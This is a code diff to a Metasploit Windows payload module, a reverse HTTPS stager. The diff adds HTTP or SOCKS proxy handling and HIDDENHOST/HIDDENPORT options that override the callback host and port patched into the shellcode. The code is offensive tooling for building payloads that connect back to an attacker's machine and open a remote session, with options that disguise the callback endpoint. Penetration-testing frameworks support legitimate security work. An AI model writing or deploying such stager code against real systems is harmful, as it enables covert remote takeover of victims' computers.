@@ -19,7 +19,7 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'          => 'Reverse HTTPS Stager with Support for Custom Proxy',
 			'Description'   => 'Tunnel communication over HTTP using SSL, supports custom proxy',
-			'Author'        => ['hdm','corelanc0d3r <peter.ve@corelan.be>'],
+			'Author'        => ['hdm','corelanc0d3r <peter.ve@corelan.be>', 'amaloteaux'],
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'win',
 			'Arch'          => ARCH_X86,
@@ -88,7 +88,11 @@ module Metasploit3
 		if proxyport == "80"
 			proxyinfo = proxyhost
 		end
-
+		if datastore['PROXY_TYPE'].to_s == 'HTTP'
+			proxyinfo = 'http://' + proxyinfo
+		else #socks
+			proxyinfo = 'socks=' + proxyinfo
+		end
 		proxyloc = p.index("PROXYHOST:PORT")
 		p = p.gsub("PROXYHOST:PORT",proxyinfo)
 
@@ -98,14 +102,26 @@ module Metasploit3
 		p[proxyloc-4] = [calloffset].pack('V')[0]
 
 		# patch the LPORT
+		if datastore['HIDDENPORT']
+			lport = datastore['HIDDENPORT']
+		else
+			lport = datastore['LPORT']
+		end
+
 		lportloc = p.index("\x68\x5c\x11\x00\x00")  # PUSH DWORD 4444
-		p[lportloc+1] = [datastore['LPORT'].to_i].pack('V')[0]
-		p[lportloc+2] = [datastore['LPORT'].to_i].pack('V')[1]
-		p[lportloc+3] = [datastore['LPORT'].to_i].pack('V')[2]
-		p[lportloc+4] = [datastore['LPORT'].to_i].pack('V')[3]
+		p[lportloc+1] = [lport.to_i].pack('V')[0]
+		p[lportloc+2] = [lport.to_i].pack('V')[1]
+		p[lportloc+3] = [lport.to_i].pack('V')[2]
+		p[lportloc+4] = [lport.to_i].pack('V')[3]
 
 		# append LHOST and return payload
-		p + datastore['LHOST'].to_s + "\x00"
+
+		if datastore['HIDDENHOST']
+			lhost = datastore['HIDDENHOST']
+		else
+			lhost = datastore['LHOST']
+		end
+		p + lhost.to_s + "\x00"
 
 	end
 
